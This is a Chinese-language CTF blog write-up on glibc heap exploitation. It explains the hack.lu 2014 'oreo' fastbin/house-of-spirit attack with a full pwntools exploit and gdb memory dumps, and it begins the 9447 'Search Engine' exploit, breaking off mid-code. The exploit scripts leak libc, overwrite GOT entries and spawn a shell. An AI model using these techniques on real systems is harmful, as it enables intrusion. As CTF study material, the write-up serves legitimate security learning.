class="comment"># RELRO:    Partial RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      No PIE (0x8048000)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"1"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Note size :"</span>, str(size))</span><br><span class="line">    io.sendlineafter(<span class="string">"Content :"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"2"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Index :"</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Print</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"3"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Index :"</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Exit</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"4"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    ptr = <span class="number">0x08048986</span></span><br><span class="line">    add(<span class="number">0x20</span>, <span class="string">'aaaa'</span>)</span><br><span class="line">    add(<span class="number">0x20</span>, <span class="string">'bbbb'</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">0x8</span>, p32(ptr))</span><br><span class="line">    Print(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure><p>接下来进入fastbin attack,fastbin attack有三个题目</p><h2 id="2014-hack-lu-oreo"><a href="#2014-hack-lu-oreo" class="headerlink" title="2014 hack.lu oreo"></a>2014 hack.lu oreo</h2><p>补充函数说明：</p><ul><li>fgets函数会在输入完成后自动在结尾添加一个’\0’，比如我们输入1234加上我们的回车总共是1234’\x0a’’\x00’他sub_80485EC这个函数会将\x0a变成\x00<br><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g2ydm1wq4ej30li04uwf2.jpg" alt="1"></li></ul><h3 id="结构体构造"><a href="#结构体构造" class="headerlink" title="结构体构造"></a>结构体构造</h3><p>开头调试的时候一直不理解他的结构体是如何构造出来的，然后ida解析出来的跟他图片上所谓结构体格格不入，所以手动调试了一下午，知道了他的结构体是如何构造的</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">gum</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">char</span> decription[<span class="number">25</span>];</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">27</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个结构体是经过调试以及看汇编得出来的，</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">sub_8048644</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v1; <span class="comment">// [esp+18h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  v1 = dword_804A288;</span><br><span class="line">  dword_804A288 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x38</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( dword_804A288 )</span><br><span class="line">  &#123;</span><br><span class="line">    *((_DWORD *)dword_804A288 + <span class="number">13</span>) = v1;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Rifle name: "</span>);</span><br><span class="line">    fgets(dword_804A288 + <span class="number">25</span>, <span class="number">56</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    sub_80485EC(dword_804A288 + <span class="number">25</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Rifle description: "</span>);</span><br><span class="line">    fgets(dword_804A288, <span class="number">56</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    sub_80485EC(dword_804A288);</span><br><span class="line">    ++dword_804A2A4;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Something terrible happened!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里可以看出filename从25开始的，推出前面的description为25，而name长度为27是如何推出来的呢？看图<br><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g2f93s8owgj31hc0sjwrg.jpg" alt="2"></p><p>我这是在输出函数</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">sub_8048729</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *i; <span class="comment">// [esp+14h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Rifle to be ordered:\n%s\n"</span>, <span class="string">"==================================="</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = dword_804A288; i; i = (<span class="keyword">char</span> *)*((_DWORD *)i + <span class="number">13</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Name: %s\n"</span>, i + <span class="number">25</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Description: %s\n"</span>, i);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"==================================="</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里下的断点，你看ida解析出来的什么鬼，i+13，莫名奇妙的写法，完全看不懂，然后我定位到这里断点后，他加的值是0x34，他是从结构体开头加的0x34(10进制:52)，然后取出下一个指针，也就是next指针，继续进行循环，ida解析出的i+13完全乱来的，52-25 = 27，所以大小就这么退出来了，不理解这个结构体，这道题很多写法都看不懂，比如他的偏移什么，理解了就好构造了。</p><h3 id="整体思路"><a href="#整体思路" class="headerlink" title="整体思路"></a>整体思路</h3><p>题目里有堆溢出，我们可以通过堆溢出溢出到结构体的next指针，让next指针指向got表某一项，从而泄露出地址，进而求出libc的地址，求出libc的地址过后，在利用house of sprit，free掉一个自己伪造的chunk,进而达到覆写got表成one_gadget，然后通过调用该函数获得权限</p><h3 id="初始化函数"><a href="#初始化函数" class="headerlink" title="初始化函数"></a>初始化函数</h3><p>将堆的各个操作写成函数，因为堆里有很多重复操作，所以这样会比较方便</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(name, description)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"1"</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line">    p.sendline(description)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"2"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"==================================="</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"3"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(payload)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"4"</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">puts</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"5"</span>)</span><br></pre></td></tr></table></figure><h3 id="leak地址"><a href="#leak地址" class="headerlink" title="leak地址"></a>leak地址</h3><p>我们知道他有个next指针，所以我们覆盖掉他的next指针，在利用show函数就可以打印任意地址的内容了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#first leak the libc</span></span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">27</span> + p32(puts_got)</span><br><span class="line">add(payload, <span class="string">'a'</span>*<span class="number">25</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">"==================================="</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Description: "</span>)</span><br><span class="line">result = p.recvuntil(<span class="string">"==================================="</span>)[:<span class="number">4</span>]</span><br><span class="line">puts_addr = u32(result)</span><br><span class="line">log.success(<span class="string">"puts_got = &#123;:#x&#125;"</span>.format(puts_addr))</span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">sys_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">bin_sh = libc_base + libc.search(<span class="string">'/bin/sh'</span>).next()</span><br></pre></td></tr></table></figure><p>这样就leak出puts的地址，接着就可以获得libc地址</p><h3 id="填充大小并修改next指针"><a href="#填充大小并修改next指针" class="headerlink" title="填充大小并修改next指针"></a>填充大小并修改next指针</h3><p>这题目有个计算数值的变量，也就是说你malloc一个，他就会加1，我们可以将这里当作chunk大小，因为一个枪支结构体大小为0x38,所以堆块大小为0x40,我们将其大小提升至0x40，并让最后一个堆块的next指针指向这块</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">i = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> i &lt; <span class="number">0x3f</span>:</span><br><span class="line">    add(<span class="string">'a'</span>*<span class="number">27</span> + p32(<span class="number">0</span>), <span class="string">'b'</span>*<span class="number">25</span>)</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">27</span> + p32(<span class="number">0x804A2A8</span>)</span><br><span class="line">add(payload, <span class="string">'a'</span>*<span class="number">25</span>)</span><br></pre></td></tr></table></figure><p>0x804a2a4是count的地址，所以+4就是堆块的数据段</p><h3 id="绕过检测"><a href="#绕过检测" class="headerlink" title="绕过检测"></a>绕过检测</h3><ol><li><p>对齐检查<br>在此处的检查中，要求堆块具有16bytes对齐，所以chunk header的起始地址应为0x**0的形式。</p></li><li><p>fake chunk 的size大小检查<br>按照上文中chunk的结构布局，使当前fake chunk的size为合适的大小，能够充足利用并且加入fastbin(0x10-0x80)，</p></li><li><p>next chunk 的size大小检查<br>除了当前chunk的大小，与目标地址物理相邻的内存空间也应按照堆块的结构将size位置改写为能够加入fastbin的合适的大小的数值。</p></li><li><p>标记位检查</p></li></ol><p>This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREVINUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED_ (second lsb) and _NON_MAIN_ARENA (third lsb) bits cause problems…. note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end.</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">### begin fake </span></span><br><span class="line">payload = p8(<span class="number">0</span>)*<span class="number">0x20</span> + p32(<span class="number">0x40</span>) + p32(<span class="number">0x100</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x34</span>, <span class="string">'b'</span>)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x80</span>, <span class="string">'c'</span>)</span><br><span class="line">edit(payload)</span><br><span class="line">delete()</span><br><span class="line">p.recvuntil(<span class="string">'Okay order submitted!\n'</span>)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/60wx 0x804a2c0-0x20</span><br><span class="line">0x804a2a0:	0x00000000	0x00000040	0x0804a2c0	0x00000000</span><br><span class="line">0x804a2b0:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0x804a2c0:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0x804a2d0:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0x804a2e0:	0x00000040	0x00000100	0x62626262	0x62626262</span><br><span class="line">0x804a2f0:	0x62626262	0x00000000	0x63636363	0x63636363</span><br><span class="line">0x804a300:	0x63636363	0x63636363	0x63636363	0x63636363</span><br><span class="line">0x804a310:	0x63636363	0x63636363	0x63636363	0x63636363</span><br><span class="line">0x804a320:	0x63636363	0x63636363	0x63636363	0x63636363</span><br><span class="line">0x804a330:	0x63636363	0x63636363	0x63636363	0x00636363</span><br><span class="line">0x804a340:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0x804a350:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0x804a360:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0x804a370:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0x804a380:	0x00000000	0x00000000	0x00000000	0x00000000</span><br></pre></td></tr></table></figure><p>可以看下内存中的内容,这就是构造完成后的图，然后free掉0x804a2a0这个大小为0x40的堆块，然后在fastbin中是FILO，所以你在申请的堆块就是申请到的是0x804a2a0这个堆块，在0x0804a2a8这个堆块的数据部分的东西就很重要了</p><h3 id="覆写got表"><a href="#覆写got表" class="headerlink" title="覆写got表"></a>覆写got表</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p32(elf.got[<span class="string">'strlen'</span>])</span><br><span class="line">payload = payload.ljust(<span class="number">25</span>,<span class="string">'a'</span>)</span><br><span class="line">add(<span class="string">'b'</span>*<span class="number">27</span> + p32(<span class="number">0</span>), payload)</span><br><span class="line">payload = p32(sys_addr) + <span class="string">";/bin/sh\x00"</span></span><br><span class="line">edit(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>这里ctf-wiki用的是strlen表，<strong>然后这里有个小细节。。。记得第二个位置才是结构体的开头，所以payload要放在add的第二个位置</strong>，构造payload为strlen的地址，然后在用edit函数进行编辑</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">Message</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v0; <span class="comment">// ST1C_4</span></span><br><span class="line"></span><br><span class="line">  v0 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Enter any notice you'd like to submit with your order: "</span>);</span><br><span class="line">  fgets(dword_804A2A8, <span class="number">128</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  sub_80485EC(dword_804A2A8);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>edit函数在ida里的原样，就是从0x804a2a8指向的空间写东西，这里指向的空间是0x0804a2c0也就是我们刚刚payload写入的位置，然后进行编辑</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/60wx 0x804a2a8-0x8</span><br><span class="line">0x804a2a0:	0x00000001	0x00000041	0x0804a250	0x61616161</span><br><span class="line">0x804a2b0:	0x61616161	0x61616161	0x61616161	0x61616161</span><br><span class="line">0x804a2c0:	0x62000061	0x62626262	0x62626262	0x62626262</span><br><span class="line">0x804a2d0:	0x62626262	0x62626262	0x62626262	0x00000000</span><br><span class="line">0x804a2e0:	0x0000000a	0x00000100	0x62626262	0x62626262</span><br><span class="line">0x804a2f0:	0x62626262	0x00000000	0x63636363	0x63636363</span><br><span class="line">0x804a300:	0x63636363	0x63636363	0x63636363	0x63636363</span><br><span class="line">0x804a310:	0x63636363	0x63636363	0x63636363	0x63636363</span><br><span class="line">0x804a320:	0x63636363	0x63636363	0x63636363	0x63636363</span><br><span class="line">0x804a330:	0x63636363	0x63636363	0x63636363	0x00636363</span><br><span class="line">0x804a340:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0x804a350:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0x804a360:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0x804a370:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0x804a380:	0x00000000	0x00000000	0x00000000	0x00000000</span><br></pre></td></tr></table></figure><p>你看，地址变成了0x804a250</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">► 0x80487eb    call   fgets@plt &lt;0x8048480&gt;</span><br><span class="line">       s: 0x804a250 (strlen@got.plt) —▸ 0xf7e3d440 ◂— 0x7c8b5756</span><br><span class="line">       n: 0x80</span><br><span class="line">       stream: 0xf7f715a0 (_IO_2_1_stdin_) ◂— 0xfbad208</span><br></pre></td></tr></table></figure><p>就是got表的地址<br>然后编辑过后调用strlen就会出发了，这里我有个不懂的地方就是将got表覆盖成system的地址，然后我不知道如何进行传参数，ctf-wiki给的是‘;/bin/sh\x00’，经过测试system(“abcd;/bin/sh”)在c语言里也是可以获得权限的，<br>这里是调用strlen，strlen求的是payload长度，所以相当于system(payload)<br>也就是相当于system(p32(sys_addr)+”;/bin/sh”)</p><p>并且他前面求出了bin_sh地址，他也没用上。应该也是这里卡住了一小会，我是转头改用了one_gadget</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p32(elf.got[<span class="string">'puts'</span>])</span><br><span class="line">payload = payload.ljust(<span class="number">25</span>,<span class="string">'a'</span>)</span><br><span class="line">add(<span class="string">'b'</span>*<span class="number">27</span> + p32(<span class="number">0</span>), payload)</span><br><span class="line">one_gadget = libc_base + <span class="number">0x5fbc5</span></span><br><span class="line">payload = p32(one_gadget)</span><br><span class="line">edit(payload)</span><br><span class="line">puts()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>完结，撒花<br>完整exp</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> PwnContext.core <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ctx.binary = <span class="string">'oreo'</span></span><br><span class="line">ctx.remote_libc = <span class="string">'libc.so.6'</span></span><br><span class="line">ctx.debug_remote_libc = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./oreo'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ctx.debug_remote_libc == <span class="literal">False</span>:</span><br><span class="line">    libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ctx.remote_libc</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    <span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">    p = ctx.start()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">""</span>,<span class="number">10000</span>)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">'PID: '</span> + str(proc.pidof(p)[<span class="number">0</span>]))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(name, description)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"1"</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line">    p.sendline(description)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"2"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"==================================="</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"3"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(payload)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"4"</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">puts</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"5"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment">#first leak the libc</span></span><br><span class="line">    puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">27</span> + p32(puts_got)</span><br><span class="line">    add(payload, <span class="string">'a'</span>*<span class="number">25</span>)</span><br><span class="line">    show()</span><br><span class="line">    p.recvuntil(<span class="string">"==================================="</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Description: "</span>)</span><br><span class="line">    result = p.recvuntil(<span class="string">"==================================="</span>)[:<span class="number">4</span>]</span><br><span class="line">    puts_addr = u32(result)</span><br><span class="line">    log.success(<span class="string">"puts_got = &#123;:#x&#125;"</span>.format(puts_addr))</span><br><span class="line">    libc_base = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">    sys_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    bin_sh = libc_base + libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line"></span><br><span class="line">    <span class="comment">#second fake bin</span></span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; <span class="number">0x3f</span>:</span><br><span class="line">        add(<span class="string">'a'</span>*<span class="number">27</span> + p32(<span class="number">0</span>), <span class="string">'b'</span>*<span class="number">25</span>)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">27</span> + p32(<span class="number">0x804A2A8</span>)</span><br><span class="line">    add(payload, <span class="string">'a'</span>*<span class="number">25</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">### begin fake </span></span><br><span class="line">    payload = p8(<span class="number">0</span>)*<span class="number">0x20</span> + p32(<span class="number">0x40</span>) + p32(<span class="number">0x100</span>)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x34</span>, <span class="string">'b'</span>)</span><br><span class="line">    payload += p32(<span class="number">0</span>)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x80</span>, <span class="string">'c'</span>)</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    edit(payload)</span><br><span class="line">    delete()</span><br><span class="line">    p.recvuntil(<span class="string">'Okay order submitted!\n'</span>)</span><br><span class="line">    payload = p32(elf.got[<span class="string">'strlen'</span>])</span><br><span class="line">    payload = payload.ljust(<span class="number">25</span>,<span class="string">'a'</span>)</span><br><span class="line">    add(<span class="string">'b'</span>*<span class="number">27</span> + p32(<span class="number">0</span>), payload)</span><br><span class="line">    <span class="comment">#one_gadget = libc_base + 0x5fbc5</span></span><br><span class="line">    <span class="comment">#payload = p32(one_gadget)</span></span><br><span class="line">    payload = p32(sys_addr) + <span class="string">";/bin/sh\x00"</span></span><br><span class="line">    edit(payload)</span><br><span class="line">    puts()</span><br><span class="line">    </span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure><h2 id="2015-9447-CTF-Search-Engine"><a href="#2015-9447-CTF-Search-Engine" class="headerlink" title="2015 9447 CTF : Search Engine"></a>2015 9447 CTF : Search Engine</h2><p>这道题说实话，我连功能怎么使用都不知道。。最后看了wp，也是似懂非懂，不过大概漏洞过程我是理解了的</p><p>先利用unsortbin泄露地址<br>double free 到malloc_hook<br>然后改malloc_hook为one_gadget<br>错位部分自己解决</p><p>最近学到一个新姿势，double free触发malloc_hook，下一篇写个最近遇到的有趣的题目</p><p>其余部分参考ctf-wiki</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PwnContext.core <span class="keyword">import</span> *</span><br><span class="line">local = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe = <span class="string">'./'</span> + <span class="string">'search'</span></span><br><span class="line">elf = context.binary = ELF(exe)</span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line">host = <span class="string">'127.0.0.1'</span></span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="comment">#ctx.binary = './' + 'search'</span></span><br><span class="line">ctx.binary = exe</span><br><span class="line">libc = args.LIBC <span class="keyword">or</span> <span class="string">'libc.so.6'</span></span><br><span class="line">ctx.debug_remote_libc = <span class="literal">True</span></span><br><span class="line">ctx.remote_libc = libc</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    io = ctx.start()</span><br><span class="line">    libc = ELF(libc)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================a</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    Partial RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      No PIE (0x400000)</span></span><br><span class="line"><span class="comment"># FORTIFY:  Enabled</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">offset_bin_main_arena</span><span class="params">(idx)</span>:</span></span><br><span class="line">    word_bytes = context.word_size / <span class="number">8</span></span><br><span class="line">    offset = <span class="number">4</span>  <span class="comment"># lock</span></span><br><span class="line">    offset += <span class="number">4</span>  <span class="comment"># flags</span></span><br><span class="line">    offset += word_bytes * <span class="number">10</span>  <span class="comment"># offset fastbin</span></span><br><span class="line">    offset += word_bytes * <span class="number">2</span>  <span class="comment"># top,last_remainder</span></span><br><span class="line">    offset += idx * <span class="number">2</span> * word_bytes  <span class="comment"># idx</span></span><br><span class="line">    offset -= word_bytes * <span class="number">2</span>  <span class="comment"># bin overlap</span></span><br><span class="line">    <span class="keyword">return</span> offset</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">unsortedbin_offset_main_arena = offset_bin_main_arena(<span class="number">0</span>)</span><br><span class="line">main_arena_offset = <span class="number">0x3c4b20</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index_sentence</span><span class="params">(s)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">"3: Quit\n"</span>)</span><br><span class="line">    io.sendline(<span class="string">'2'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">"Enter the sentence size:\n"</span>)</span><br><span class="line">    io.sendline(str(len(s)))</span><br><span class="line">    io.send(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search_word</span><span class="params">(word)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">"3: Quit\n"</span>)</span><br><span class="line">    io.sendline(<span class="string">'1'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">"Enter the word size:\n"</span>)</span><br><span class="line">    io.sendline(str(len(word)))</span><br><span class="line">    io.send(word)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_libc</span><span class="params">()</span>:</span></span><br><span class="line">    smallbin_sentence = <span class="string">'s'</span> * <span class="number">0x85</span> + <span class="string">' m '</span></span><br><span class="line">    index_sentence(smallbin_sentence)</span><br><span class="line">    search_word(<span class="string">'m'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'Delete this sentence (y/n)?\n'</span>)</span><br><span class="line">    io.sendline(<span class="string">'y'</span>)</span><br><span class="line">    search_word(<span class="string">'\x00'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'Found '</span> + str(len(smallbin_sentence)) + <span class="string">': '</span>)</span><br><span class="line">    unsortedbin_addr = u64(io.recv(<span class="number">8</span>))</span><br><span class="line">    io.recvuntil(<span class="string">'Delete this sentence (y/n)?\n'</span>)</span><br><span class="line">    io.sendline(<span class="string">'n'</span>)</span><br><span class="line">    <span class="keyword">return</span> 